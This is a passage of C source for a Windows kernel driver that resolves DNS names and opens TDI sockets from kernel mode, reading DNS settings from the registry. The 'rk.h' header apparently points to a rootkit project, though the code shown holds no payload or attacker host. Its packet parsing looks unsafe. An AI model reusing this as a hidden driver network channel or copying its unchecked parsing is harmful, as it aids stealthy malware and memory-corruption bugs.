#include "rk.h"
#include "CommandLine.h"
#include "Utils.h"
#include "Crc32.h"
#include <tdi.h>
#include <tdikrnl.h>
#include "TdiSocket.h"

PDNSADDRANDURL g_pWSAData = NULL;

unsigned char MyNToACharStrings[][4] = {
	'0', 'x', 'x', '1',
	'1', 'x', 'x', '1',
	'2', 'x', 'x', '1',
	'3', 'x', 'x', '1',
	'4', 'x', 'x', '1',
	'5', 'x', 'x', '1',
	'6', 'x', 'x', '1',
	'7', 'x', 'x', '1',
	'8', 'x', 'x', '1',
	'9', 'x', 'x', '1',
	'1', '0', 'x', '2',
	'1', '1', 'x', '2',
	'1', '2', 'x', '2',
	'1', '3', 'x', '2',
	'1', '4', 'x', '2',
	'1', '5', 'x', '2',
	'1', '6', 'x', '2',
	'1', '7', 'x', '2',
	'1', '8', 'x', '2',
	'1', '9', 'x', '2',
	'2', '0', 'x', '2',
	'2', '1', 'x', '2',
	'2', '2', 'x', '2',
	'2', '3', 'x', '2',
	'2', '4', 'x', '2',
	'2', '5', 'x', '2',
	'2', '6', 'x', '2',
	'2', '7', 'x', '2',
	'2', '8', 'x', '2',
	'2', '9', 'x', '2',
	'3', '0', 'x', '2',
	'3', '1', 'x', '2',
	'3', '2', 'x', '2',
	'3', '3', 'x', '2',
	'3', '4', 'x', '2',
	'3', '5', 'x', '2',
	'3', '6', 'x', '2',
	'3', '7', 'x', '2',
	'3', '8', 'x', '2',
	'3', '9', 'x', '2',
	'4', '0', 'x', '2',
	'4', '1', 'x', '2',
	'4', '2', 'x', '2',
	'4', '3', 'x', '2',
	'4', '4', 'x', '2',
	'4', '5', 'x', '2',
	'4', '6', 'x', '2',
	'4', '7', 'x', '2',
	'4', '8', 'x', '2',
	'4', '9', 'x', '2',
	'5', '0', 'x', '2',
	'5', '1', 'x', '2',
	'5', '2', 'x', '2',
	'5', '3', 'x', '2',
	'5', '4', 'x', '2',
	'5', '5', 'x', '2',
	'5', '6', 'x', '2',
	'5', '7', 'x', '2',
	'5', '8', 'x', '2',
	'5', '9', 'x', '2',
	'6', '0', 'x', '2',
	'6', '1', 'x', '2',
	'6', '2', 'x', '2',
	'6', '3', 'x', '2',
	'6', '4', 'x', '2',
	'6', '5', 'x', '2',
	'6', '6', 'x', '2',
	'6', '7', 'x', '2',
	'6', '8', 'x', '2',
	'6', '9', 'x', '2',
	'7', '0', 'x', '2',
	'7', '1', 'x', '2',
	'7', '2', 'x', '2',
	'7', '3', 'x', '2',
	'7', '4', 'x', '2',
	'7', '5', 'x', '2',
	'7', '6', 'x', '2',
	'7', '7', 'x', '2',
	'7', '8', 'x', '2',
	'7', '9', 'x', '2',
	'8', '0', 'x', '2',
	'8', '1', 'x', '2',
	'8', '2', 'x', '2',
	'8', '3', 'x', '2',
	'8', '4', 'x', '2',
	'8', '5', 'x', '2',
	'8', '6', 'x', '2',
	'8', '7', 'x', '2',
	'8', '8', 'x', '2',
	'8', '9', 'x', '2',
	'9', '0', 'x', '2',
	'9', '1', 'x', '2',
	'9', '2', 'x', '2',
	'9', '3', 'x', '2',
	'9', '4', 'x', '2',
	'9', '5', 'x', '2',
	'9', '6', 'x', '2',
	'9', '7', 'x', '2',
	'9', '8', 'x', '2',
	'9', '9', 'x', '2',
	'1', '0', '0', '3',
	'1', '0', '1', '3',
	'1', '0', '2', '3',
	'1', '0', '3', '3',
	'1', '0', '4', '3',
	'1', '0', '5', '3',
	'1', '0', '6', '3',
	'1', '0', '7', '3',
	'1', '0', '8', '3',
	'1', '0', '9', '3',
	'1', '1', '0', '3',
	'1', '1', '1', '3',
	'1', '1', '2', '3',
	'1', '1', '3', '3',
	'1', '1', '4', '3',
	'1', '1', '5', '3',
	'1', '1', '6', '3',
	'1', '1', '7', '3',
	'1', '1', '8', '3',
	'1', '1', '9', '3',
	'1', '2', '0', '3',
	'1', '2', '1', '3',
	'1', '2', '2', '3',
	'1', '2', '3', '3',
	'1', '2', '4', '3',
	'1', '2', '5', '3',
	'1', '2', '6', '3',
	'1', '2', '7', '3',
	'1', '2', '8', '3',
	'1', '2', '9', '3',
	'1', '3', '0', '3',
	'1', '3', '1', '3',
	'1', '3', '2', '3',
	'1', '3', '3', '3',
	'1', '3', '4', '3',
	'1', '3', '5', '3',
	'1', '3', '6', '3',
	'1', '3', '7', '3',
	'1', '3', '8', '3',
	'1', '3', '9', '3',
	'1', '4', '0', '3',
	'1', '4', '1', '3',
	'1', '4', '2', '3',
	'1', '4', '3', '3',
	'1', '4', '4', '3',
	'1', '4', '5', '3',
	'1', '4', '6', '3',
	'1', '4', '7', '3',
	'1', '4', '8', '3',
	'1', '4', '9', '3',
	'1', '5', '0', '3',
	'1', '5', '1', '3',
	'1', '5', '2', '3',
	'1', '5', '3', '3',
	'1', '5', '4', '3',
	'1', '5', '5', '3',
	'1', '5', '6', '3',
	'1', '5', '7', '3',
	'1', '5', '8', '3',
	'1', '5', '9', '3',
	'1', '6', '0', '3',
	'1', '6', '1', '3',
	'1', '6', '2', '3',
	'1', '6', '3', '3',
	'1', '6', '4', '3',
	'1', '6', '5', '3',
	'1', '6', '6', '3',
	'1', '6', '7', '3',
	'1', '6', '8', '3',
	'1', '6', '9', '3',
	'1', '7', '0', '3',
	'1', '7', '1', '3',
	'1', '7', '2', '3',
	'1', '7', '3', '3',
	'1', '7', '4', '3',
	'1', '7', '5', '3',
	'1', '7', '6', '3',
	'1', '7', '7', '3',
	'1', '7', '8', '3',
	'1', '7', '9', '3',
	'1', '8', '0', '3',
	'1', '8', '1', '3',
	'1', '8', '2', '3',
	'1', '8', '3', '3',
	'1', '8', '4', '3',
	'1', '8', '5', '3',
	'1', '8', '6', '3',
	'1', '8', '7', '3',
	'1', '8', '8', '3',
	'1', '8', '9', '3',
	'1', '9', '0', '3',
	'1', '9', '1', '3',
	'1', '9', '2', '3',
	'1', '9', '3', '3',
	'1', '9', '4', '3',
	'1', '9', '5', '3',
	'1', '9', '6', '3',
	'1', '9', '7', '3',
	'1', '9', '8', '3',
	'1', '9', '9', '3',
	'2', '0', '0', '3',
	'2', '0', '1', '3',
	'2', '0', '2', '3',
	'2', '0', '3', '3',
	'2', '0', '4', '3',
	'2', '0', '5', '3',
	'2', '0', '6', '3',
	'2', '0', '7', '3',
	'2', '0', '8', '3',
	'2', '0', '9', '3',
	'2', '1', '0', '3',
	'2', '1', '1', '3',
	'2', '1', '2', '3',
	'2', '1', '3', '3',
	'2', '1', '4', '3',
	'2', '1', '5', '3',
	'2', '1', '6', '3',
	'2', '1', '7', '3',
	'2', '1', '8', '3',
	'2', '1', '9', '3',
	'2', '2', '0', '3',
	'2', '2', '1', '3',
	'2', '2', '2', '3',
	'2', '2', '3', '3',
	'2', '2', '4', '3',
	'2', '2', '5', '3',
	'2', '2', '6', '3',
	'2', '2', '7', '3',
	'2', '2', '8', '3',
	'2', '2', '9', '3',
	'2', '3', '0', '3',
	'2', '3', '1', '3',
	'2', '3', '2', '3',
	'2', '3', '3', '3',
	'2', '3', '4', '3',
	'2', '3', '5', '3',
	'2', '3', '6', '3',
	'2', '3', '7', '3',
	'2', '3', '8', '3',
	'2', '3', '9', '3',
	'2', '4', '0', '3',
	'2', '4', '1', '3',
	'2', '4', '2', '3',
	'2', '4', '3', '3',
	'2', '4', '4', '3',
	'2', '4', '5', '3',
	'2', '4', '6', '3',
	'2', '4', '7', '3',
	'2', '4', '8', '3',
	'2', '4', '9', '3',
	'2', '5', '0', '3',
	'2', '5', '1', '3',
	'2', '5', '2', '3',
	'2', '5', '3', '3',
	'2', '5', '4', '3',
	'2', '5', '5', '3'
};

BOOLEAN QueryDnsAddress(PUCHAR pHostNameA,ULONG *ulAddress)
{
	ULONG ulDns;
	
	ulDns = 0;

	do 
	{
		g_pWSAData = (PDNSADDRANDURL)ExAllocatePool(NonPagedPool,sizeof(DNSADDRANDURL));
	} while (NULL == g_pWSAData);
	RtlZeroMemory(g_pWSAData,sizeof(DNSADDRANDURL));

	ulDns = ReadDnsServerFromRegistry();
	g_pWSAData->serveur_dns = ulDns;
	gethostbyname((PCHAR)pHostNameA);
	DbgPrint("remote ip address is %x\n",g_pWSAData->urladdr);
	*ulAddress = g_pWSAData->urladdr;
	return TRUE;
}
int ReadDnsServerFromRegistry()
{
	//Variables locales
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	WCHAR ChaineRegistre[] = L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces";
	UNICODE_STRING usRegistryKey = {0};
	OBJECT_ATTRIBUTES obNomClefRegistre = {0};
	HANDLE RegHandle = 0;
	UNICODE_STRING usRegistryKeySub = {0};
	OBJECT_ATTRIBUTES obNomClefRegistreSub = {0};
	HANDLE RegHandleSub = 0;
	WCHAR ChaineEnableDHCP[] = L"EnableDHCP";
	WCHAR ChaineNameServer[] = L"NameServer";
	WCHAR ChaineDhcpNameServer[] = L"DhcpNameServer";	//有问题这个，注册表里好像没有
	//DhcpServer
	char informations_lues[256];
	ULONG size_lue = 0;
	KEY_VALUE_FULL_INFORMATION *KeyValue = NULL;
	char adresses_ips_dns[40];
	int compteur_subkey = 0;
	unsigned int adresse = 0;
	ANSI_STRING AnsiString;
	UNICODE_STRING CurrentName;
	RtlInitUnicodeString(&usRegistryKey,ChaineRegistre);
	InitializeObjectAttributes(&obNomClefRegistre,&usRegistryKey,OBJ_CASE_INSENSITIVE| OBJ_KERNEL_HANDLE,NULL,NULL);
	status = ZwOpenKey(&RegHandle,KEY_READ,&obNomClefRegistre);
	if (status != STATUS_SUCCESS)
	{
		return -1;
	}
	compteur_subkey = 0;
	status = STATUS_SUCCESS;
	while (TRUE)
	{
		memset(informations_lues,0,256);
		status = ZwEnumerateKey (RegHandle,
			compteur_subkey,
			KeyBasicInformation,
			&informations_lues,
			256,
			&size_lue);
		if (status != STATUS_SUCCESS)
			break;
		RtlInitUnicodeString (&usRegistryKeySub,((*(KEY_BASIC_INFORMATION*)&informations_lues).Name));
		InitializeObjectAttributes(&obNomClefRegistreSub,&usRegistryKeySub,OBJ_CASE_INSENSITIVE| OBJ_KERNEL_HANDLE,NULL,NULL);
		obNomClefRegistreSub.RootDirectory = RegHandle;
		status = ZwOpenKey( &RegHandleSub,KEY_READ,&obNomClefRegistreSub);
		if (status != STATUS_SUCCESS)
		{
			compteur_subkey++;
			continue;
		}
		memset(informations_lues,0,256);
		RtlInitUnicodeString(&usRegistryKey,ChaineEnableDHCP);
		status = ZwQueryValueKey (RegHandleSub,
			&usRegistryKey,
			KeyValueFullInformation,
			&informations_lues,
			256,
			&size_lue);
		if (status != STATUS_SUCCESS)
		{
			compteur_subkey++;
			ZwClose(RegHandleSub);
			continue;
		}
		KeyValue = (KEY_VALUE_FULL_INFORMATION *)informations_lues;
		if ( *(int*) (informations_lues+KeyValue->DataOffset))
		{
			RtlInitUnicodeString (&usRegistryKey,ChaineDhcpNameServer);
		}
		else
		{
			RtlInitUnicodeString(&usRegistryKey,ChaineNameServer);
		}
		memset(informations_lues,0,256);
		status = ZwQueryValueKey(RegHandleSub,
			&usRegistryKey,
			KeyValueFullInformation ,
			&informations_lues,
			256,
			&size_lue);
		if (status != STATUS_SUCCESS)
		{
			compteur_subkey++;
			ZwClose(RegHandleSub);
			continue;
		}
		RtlZeroMemory(adresses_ips_dns,40);
		RtlInitUnicodeString(&CurrentName,(PCWSTR)(informations_lues+KeyValue->DataOffset));
		RtlUnicodeStringToAnsiString(&AnsiString,&CurrentName,TRUE);
		RtlCopyMemory(adresses_ips_dns,AnsiString.Buffer,40);
		DbgPrint("DNS SERVICE IP %s\n",adresses_ips_dns);
		ZwClose(RegHandleSub);
		adresse = myinet_addr(adresses_ips_dns);
		if (adresse == 0)
		{
			compteur_subkey++;
			continue;
		}
		ZwClose (RegHandle);
		compteur_subkey++;
		return adresse;
	}
	ZwClose (RegHandle);
	return -1;
}
/*
返回网络字节顺序
*/
int ReadHostIPsFromRegistry( )
{
	NTSTATUS		status = STATUS_UNSUCCESSFUL;
	int*			pHostentArray= NULL;
	char*			pHostentData = NULL;

	WCHAR			ChaineRegistre[] = L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces";

	UNICODE_STRING  usRegistryKey = {0};
	OBJECT_ATTRIBUTES		obNomClefRegistre = {0};
	HANDLE			RegHandle = 0;

	UNICODE_STRING     usRegistryKeySub = {0};
	OBJECT_ATTRIBUTES  obNomClefRegistreSub = {0};
	HANDLE			   RegHandleSub = 0;

	WCHAR       ChaineEnableDHCP[] =	L"EnableDHCP";
	WCHAR       ChaineIPAddress[]  =	L"IPAddress";
	WCHAR       ChaineDhcpIPAddress[] = L"DhcpIPAddress";

	char        informations_lues[256];
	ULONG       size_lue = 0;

	KEY_VALUE_FULL_INFORMATION *KeyValue = NULL;
	char        adresse_ip[20];

	int          compteur_subkey = 0;
	unsigned int adresse = 0;

	ANSI_STRING AnsiString;
	UNICODE_STRING CurrentName;

	RtlInitUnicodeString ( &usRegistryKey, 
		ChaineRegistre);

	InitializeObjectAttributes ( &obNomClefRegistre,
		&usRegistryKey,
		OBJ_CASE_INSENSITIVE| OBJ_KERNEL_HANDLE,
		NULL,NULL);

	status = ZwOpenKey( &RegHandle,//打开主键
		KEY_READ,
		&obNomClefRegistre);
	if (status != STATUS_SUCCESS)
	{
		return -1;
	}

	compteur_subkey = 0;//子键的个数
	status = STATUS_SUCCESS;
	while (TRUE)
	{
		memset(informations_lues,0,256);
		status = ZwEnumerateKey ( RegHandle,
			compteur_subkey,
			KeyBasicInformation,
			&informations_lues,
			256,
			&size_lue);

		if (status != STATUS_SUCCESS)
			break;

		RtlInitUnicodeString ( &usRegistryKeySub, 
			((*(KEY_BASIC_INFORMATION*)&informations_lues).Name));
		DbgPrint("subkey is  %ws",usRegistryKeySub.Buffer);

		InitializeObjectAttributes(&obNomClefRegistreSub,
			&usRegistryKeySub,
			OBJ_CASE_INSENSITIVE| OBJ_KERNEL_HANDLE,
			NULL,
			NULL);

		obNomClefRegistreSub.RootDirectory = RegHandle;

		status = ZwOpenKey( &RegHandleSub,
			KEY_READ,
			&obNomClefRegistreSub);
		if (status != STATUS_SUCCESS)
		{
			compteur_subkey++;
			DbgPrint("[niveau socket] !! ReadHostIPsFromRegistry : Echec d'ouverture du registre sur sous-clef\n");
			continue;
		}

		memset(informations_lues,0,256);
		RtlInitUnicodeString ( &usRegistryKey, ChaineEnableDHCP);

		status = ZwQueryValueKey (RegHandleSub,
			&usRegistryKey,
			KeyValueFullInformation,
			&informations_lues,
			256,
			&size_lue);

		if (status != STATUS_SUCCESS)
		{
			compteur_subkey++;
			DbgPrint("[niveau socket] !! ReadHostIPsFromRegistry : Echec lecture valeur EnableDHCP\n");
			ZwClose(RegHandleSub);
			continue;
		}

		KeyValue = (KEY_VALUE_FULL_INFORMATION *)informations_lues;
		if ( *(int*) (informations_lues+KeyValue->DataOffset))
		{
			RtlInitUnicodeString ( &usRegistryKey, ChaineDhcpIPAddress);
		}
		else
		{
			RtlInitUnicodeString ( &usRegistryKey,ChaineIPAddress);
		}

		memset(informations_lues,0,256);
		status = ZwQueryValueKey (	RegHandleSub,
			&usRegistryKey,
			KeyValueFullInformation ,
			&informations_lues,
			256,
			&size_lue);
		if (status != STATUS_SUCCESS)
		{
			compteur_subkey++; 
			ZwClose(RegHandleSub);
			continue;
		}

		RtlZeroMemory(adresse_ip,20);
		RtlInitUnicodeString(&CurrentName, (PCWSTR)informations_lues+KeyValue->DataOffset);
		RtlUnicodeStringToAnsiString(&AnsiString,&CurrentName,TRUE);
		RtlCopyMemory(adresse_ip,AnsiString.Buffer,20);

		DbgPrint("HOST IP %s",adresse_ip);

		ZwClose(RegHandleSub);

		adresse = myinet_addr(adresse_ip);
		if (adresse == 0)
		{	compteur_subkey++;
		continue;
		}
		else 
		{	 
			return adresse;	
		}
	}
	ZwClose (RegHandle);

	return adresse;
}	
PHOSTENT gethostbyname(char *name)
{	
	sockaddr_in sockaddr_dns = {0};
	unsigned char* phostent_buf = NULL;

	if (g_pWSAData->serveur_dns == 0)
	{		
		return NULL;
	}
	do 
	{
		phostent_buf = (unsigned char*)KernelMalloc(2048);
	} while (NULL == phostent_buf);
	RtlZeroMemory(phostent_buf,2048);

	sockaddr_dns.sin_family = AF_INET;
	sockaddr_dns.sin_addr.s_addr = g_pWSAData->serveur_dns;//DNS的主机地址
	sockaddr_dns.sin_port = HTONS(53);//dns 服务器固定端口
	if (disaquery_dns(sockaddr_dns,name,(char*)phostent_buf,FALSE) != -1)		
	{		
		return (PHOSTENT)phostent_buf;
	}
	else
	{
		KernelFree(phostent_buf);
		return NULL;
	}
}
int disaquery_dns(sockaddr_in sockaddr_dns,char* URL,char *hostent_buf,int rdns)//rdns 是否反向查询
{
	sockaddr_in	sockaddr_bind = {0};
	int com_socket = 0;
	NTSTATUS status = STATUS_UNSUCCESSFUL;

	int size_string_requete_format_dns = 0;
	int size_string_requete = 0;

	unsigned char * buf=NULL;//需要构造的缓冲区
	unsigned char * reader;  //读取的位置指针
	DNS_HEADER	  *	dns = NULL;
	int				size_buffer_dns = 0;// sendto must be know length of databuf

	char *				res_record_crawler = NULL;
	CUSTOM_RES_RECORD * res_record = NULL;
	unsigned int *		adresse_ip = NULL;
	int					compteur_reponses = 0;

	PHOSTENT	hostent = NULL;
	char*		hostent_content = NULL;
	char**		hostent_array = NULL;//指向指针的指针

	unsigned char * qname = NULL;
	QUESTION *   qinfo = NULL;

	int lock = 0,i,j,k;
	int stop;

	sockaddr_in a;//便于记录读取的IP 
	RES_RECORD answers[20],auth[20],addit[20];  //the replies from the DNS server

	PUCHAR returnaddr;//指针

	int lenth = sizeof(DNS_HEADER);
	do 
	{
		buf = (unsigned char*)KernelMalloc(2048);
	} while (NULL == buf);
	RtlZeroMemory(buf,2048);

	/*
	+---------------------+
	| Header              |
	+---------------------+
	| Question            | the question for the name server
	+---------------------+
	| Answer              | RRs answering the question
	+---------------------+
	| Authority           | RRs pointing toward an authority
	+---------------------+
	| Additional          | RRs holding additional information
	+---------------------+


	+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
	| ID                                            |
	+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
	|QR| Opcode    |AA|TC|RD|RA| Z      |  RCODE    |
	+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
	|                   QDCOUNT                     |
	+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
	|                   ANCOUNT                     |
	+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
	|                   NSCOUNT                     |
	+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
	|                   ARCOUNT                     |
	+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

	*/
	//1 Construction du message DNS 
	//buffer : DNS_HEADER | nom modifi?| QUESTION
	dns=(DNS_HEADER*)buf;

	dns->id = 1234;

	//Flags DNS
	dns->qr = 0; //This is a query
	dns->opcode = 0; //This is a standard query
	dns->aa = 0; //Not Authoritative
	dns->tc = 0; //This message is not truncated
	dns->rd = 1; //Recursion Desired
	dns->ra = 0; //Recursion not available! hey we dont have it (lol)
	dns->z = 0;
	dns->ad = 0;
	dns->cd = 0;
	dns->rcode = 0;

	dns->q_count = HTONS(1); //we have only 1 question
	dns->ans_count = 0;
	dns->auth_count = 0;
	dns->add_count = 0;

	//point to the query portion
	qname =(unsigned char*)&buf[sizeof( DNS_HEADER)];

	ChangetoDnsNameFormat(qname,(unsigned char *)URL);

	qinfo =(QUESTION*)&buf[sizeof( DNS_HEADER) + (strlen((const char*)qname) + 1)]; //fill it

	qinfo->qtype = HTONS(1);  //we are requesting the ipv4 address
	qinfo->qclass = HTONS(1); //its internet always is 1 

	size_buffer_dns = sizeof(DNS_HEADER) + strlen((char*)qname) + 1 + sizeof(QUESTION);//33

	//com_socket = socket(AF_INET, SOCK_DGRAM ,IPPROTO_UDP);//udp 数据报查询
	com_socket = socket(2,2,17);
	if (com_socket == -1)
	{
		ExFreePool(buf);
		return -1;
	}

	status = mysendto(com_socket,(char*)buf,size_buffer_dns,0,&sockaddr_dns,sizeof(sockaddr_in));
	if ( status == -1)
	{

		ExFreePool (buf);
		status = close(com_socket);
		if ( status == -1)   
		{;}
		return -1;
	}

	k =sizeof(sockaddr_in);

	status = recvfrom(com_socket,(char*)buf,1024*2,0,(sockaddr_in *)&sockaddr_dns,&k);
	if ( status == -1)
	{	
		ExFreePool (buf);
		status = close(com_socket);
		if ( status == -1)   
		{;}
		return -1;
	}
	DbgPrint("received ok \n ");

	status = close(com_socket);
	if ( status == -1)
	{
		return -1;
	}


	dns=(DNS_HEADER*)buf;

	if (dns->ans_count == 0)
	{
		ExFreePool (buf);
		return -1;
	}
	else
	{
		//http://www.codeproject.com/KB/IP/dns_query.aspx  如果你还不知道返回数据格式，可以参考这篇文章
		//move ahead of the dns header and the query field
		//从返回的数据开始读取，也就是去除自己的构造部分
		reader=&buf[sizeof(DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(QUESTION)];
		DbgPrint("The response contains : \n");
		DbgPrint("%d Questions.\n",ntohs(dns->q_count));
		DbgPrint("%d Answers.\n",ntohs(dns->ans_count));
		DbgPrint("%d Authoritative Servers.\n",ntohs(dns->auth_count));
		DbgPrint("%d Additional records.\n",ntohs(dns->add_count));

		//reading answers
		stop=0;

		for(i=0;i<ntohs(dns->ans_count);i++)
		{
			answers[i].name=ReadName(reader,buf,&stop);
			reader = reader + stop;
			answers[i].resource = (PR_DATA)(reader);
			reader = reader + sizeof(R_DATA);
			if(ntohs(answers[i].resource->type) == 1) //if its an ipv4 address
			{
				answers[i].rdata = (unsigned char*)KernelMalloc(ntohs(answers[i].resource->data_len));
				for(j=0 ; j<ntohs(answers[i].resource->data_len) ; j++)
					answers[i].rdata[j]=reader[j];	
				answers[i].rdata[ntohs(answers[i].resource->data_len)] = '\0';
				reader = reader + ntohs(answers[i].resource->data_len);
			}
			else
			{
				answers[i].rdata = ReadName(reader,buf,&stop);
				reader = reader + stop;
			}	
		}

		//read authorities
		for(i=0;i<ntohs(dns->auth_count);i++)
		{
			auth[i].name=ReadName(reader,buf,&stop);
			reader+=stop;

			auth[i].resource=(R_DATA*)(reader);
			reader+=sizeof(R_DATA);

			auth[i].rdata=ReadName(reader,buf,&stop);
			reader+=stop;
		}

		//read additional
		for(i=0;i<ntohs(dns->add_count);i++)
		{
			addit[i].name=ReadName(reader,buf,&stop);
			reader+=stop;

			addit[i].resource=(R_DATA*)(reader);
			reader+=sizeof(R_DATA);

			if(ntohs(addit[i].resource->type)==1)
			{
				addit[i].rdata = (unsigned char*)KernelMalloc(ntohs(addit[i].resource->data_len));
				for(j=0;j<ntohs(addit[i].resource->data_len);j++)
					addit[i].rdata[j]=reader[j];

				addit[i].rdata[ntohs(addit[i].resource->data_len)]='\0';
				reader+=ntohs(addit[i].resource->data_len);

			}
			else
			{
				addit[i].rdata=ReadName(reader,buf,&stop);
				reader+=stop;
			}
		}


		//print answers
		for(i=0;i<ntohs(dns->ans_count);i++)
		{
			//printf("\nAnswer : %d",i+1);
			DbgPrint("Name  :  %s ",answers[i].name);

			if(ntohs(answers[i].resource->type)==1)   //IPv4 address
			{	
				long *p;
				p=(long*)answers[i].rdata;
				a.sin_addr.s_addr=(*p);    //working without ntohl
				DbgPrint("has IPv4 address :  %x\n",*p);

				RtlCopyMemory(&(g_pWSAData->urladdr),p,4); //保存在全局变量中

				do 
				{
					returnaddr = (PUCHAR)KernelMalloc(16);
				} while (NULL == returnaddr);
				RtlZeroMemory(returnaddr,16);
				RtlCopyMemory(returnaddr,myinet_ntoa(a.sin_addr),16);
				DbgPrint("has IPv4 address :  %s\n",returnaddr[i]);
				KernelFree(returnaddr); 
			}
			if(ntohs(answers[i].resource->type)==5)   //Canonical name for an alias
				DbgPrint("has alias name : %s\n",answers[i].rdata);		
			DbgPrint("\n");
		}

		//print authorities
		for(i = 0;i < ntohs(dns->auth_count);i++)
		{
			//printf("\nAuthorities : %d",i+1);
			DbgPrint("Name  :  %s ",auth[i].name);
			if(ntohs(auth[i].resource->type)==2)
				DbgPrint("has authoritative nameserver : %s",auth[i].rdata);
			DbgPrint("\n");
		}

		//print additional resource records
		for(i=0;i<ntohs(dns->add_count);i++)
		{
			//printf("\nAdditional : %d",i+1);
			DbgPrint("Name  :  %s ",addit[i].name);
			if(ntohs(addit[i].resource->type)==1)
			{
				long *p;
				p=(long*)addit[i].rdata;
				a.sin_addr.s_addr=(*p);    //working without ntohl
				DbgPrint("has IPv4 address :  %s",myinet_ntoa(a.sin_addr));
			}
			DbgPrint("\n");
		}
	}
	ExFreePool(buf);
	return 0;
}


unsigned char* ReadName(unsigned char* reader,unsigned char* buffer,int* count)
{
	PUCHAR pNameA;
	unsigned int p = 0,jumped = 0,offset;

	pNameA = NULL;
	*count = 1;
	do 
	{
		pNameA = KernelMalloc(256);
	} while (NULL == pNameA);
	RtlZeroMemory(pNameA,256);

	//read the names in 3www6google3com format
	while(*reader != 0)
	{
		if(*reader >= 192)
		{
			offset = (*reader)*256 + *(reader+1) - 49152; //49152 = 11000000 00000000  ;)
			reader = buffer + offset - 1;
			jumped = 1;  //we have jumped to another location so counting wont go up!
		}
		else
		{
			pNameA[p++] = *reader;
		}
		reader = reader + 1;
		if(jumped == 0)
		{
			*count = *count + 1; //if we havent jumped to another location then we can count up
		}
	}
	pNameA[p] = '\0';    //string complete
	if(jumped==1) *count = *count + 1;  //number of steps we actually moved forward in the packet
	ChangefromDnsNameFormat(pNameA);
	return pNameA;		
}
//this will convert www.google.com to 3www6google3com ;got it :)
void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host)
{
	int lock = 0 ,i;

	strcat_s((char*)host,strlen(host),".");

	for(i = 0;i < (int)strlen((char*)host);i++)
	{
		if(host[i] == '.')
		{
			*dns++ = i - lock;
			for(;lock < i;lock++)
			{
				*dns++ = host[lock];
			}
			lock++; //or lock=i+1;
		}
	}
	*dns++ = '\0';
}
//this will convert 3www6google3com to www.google.com ;got it :)
void ChangefromDnsNameFormat(unsigned char* name)
{
	int i ,j;
	char p;

	//now convert 3www6google3com0 to www.google.com
	for(i=0;i<(int)strlen((const char*)name);i++)
	{
		p=name[i];
		for(j=0;j<(int)p;j++)
		{
			name[i]=name[i+1];
			i=i+1;
		}
		name[i]='.';
	}
	name[i-1]='\0';	  //remove the last dot
}

int __cdecl bind(int socket, sockaddr_in *addr, int addrlen)
{
	PSOCKET s = (PSOCKET) -socket;
	sockaddr_in* localAddr = (sockaddr_in*) addr;
	UNICODE_STRING devName;
	NTSTATUS status;

	if (s->isBound || addr == NULL || addrlen < sizeof(sockaddr_in))
	{
		return -1;
	}

	if (s->type == SOCK_DGRAM)
	{
		RtlInitUnicodeString(&devName, L"\\Device\\Udp");
	}
	else if (s->type == SOCK_STREAM)
	{
		RtlInitUnicodeString(&devName, L"\\Device\\Tcp");
	}
	else
	{
		return -1;
	}

	status = tdi_open_transport_address(
		&devName,
		localAddr->sin_addr.s_addr,
		localAddr->sin_port,
		s->isShared,
		&s->addressHandle,
		&s->addressFileObject
		);

	if (!NT_SUCCESS(status))
	{
		s->addressFileObject = NULL;
		s->addressHandle = (HANDLE) -1;
		return status;
	}

	if (s->type == SOCK_STREAM)
	{
		tdi_set_event_handler(s->addressFileObject, TDI_EVENT_DISCONNECT, event_disconnect, s);
	}

	s->isBound = TRUE;

	return 0;
}
NTSTATUS event_disconnect(PVOID TdiEventContext, \
						  PVOID ConnectionContext, \
						  LONG DisconnectDataLength, \
						  PVOID DisconnectData, \
						  LONG DisconnectInformationLength, \
						  PVOID DisconnectInformation, \
						  ULONG DisconnectFlags)
{
	PSOCKET s = (PSOCKET) TdiEventContext;
	PSTREAM_SOCKET streamSocket = (PSTREAM_SOCKET) ConnectionContext;
	KeSetEvent(&streamSocket->disconnectEvent, 0, FALSE);
	return STATUS_SUCCESS;
}

NTSTATUS tdi_set_event_handler(PFILE_OBJECT addressFileObject, LONG eventType, PVOID eventHandler, PVOID eventContext)
{
	PDEVICE_OBJECT  devObj;
	KEVENT          event;
	PIRP            irp;
	IO_STATUS_BLOCK iosb;
	NTSTATUS        status;

	devObj = IoGetRelatedDeviceObject(addressFileObject);

	KeInitializeEvent(&event, NotificationEvent, FALSE);

	irp = TdiBuildInternalDeviceControlIrp(TDI_SET_EVENT_HANDLER, devObj, addressFileObject, &event, &iosb);

	if (irp == NULL)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	TdiBuildSetEventHandler(irp, devObj, addressFileObject, NULL, NULL, eventType, eventHandler, eventContext);

	status = IoCallDriver(devObj, irp);

	if (status == STATUS_PENDING)
	{
		KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
		status = iosb.Status;
	}

	return status;
}


int __cdecl close(int socket)
{
	PSOCKET s = (PSOCKET) -socket;

	if (s->isBound)
	{
		if (s->type == SOCK_STREAM && s->streamSocket)
		{
			if (s->isConnected)
			{
				if (!s->isShuttingdown)
				{
					tdi_disconnect(s->streamSocket->connectionFileObject, TDI_DISCONNECT_RELEASE);
				}
				KeWaitForSingleObject(&s->streamSocket->disconnectEvent, Executive, KernelMode, FALSE, NULL);
			}
			if (s->streamSocket->connectionFileObject)
			{
				tdi_disassociate_address(s->streamSocket->connectionFileObject);
				ObDereferenceObject(s->streamSocket->connectionFileObject);
			}
			if (s->streamSocket->connectionHandle != (HANDLE) -1)
			{
				ZwClose(s->streamSocket->connectionHandle);
			}
			ExFreePool(s->streamSocket);
		}

		if (s->type == SOCK_DGRAM || s->type == SOCK_STREAM)
		{
			ObDereferenceObject(s->addressFileObject);
			if (s->addressHandle != (HANDLE) -1)
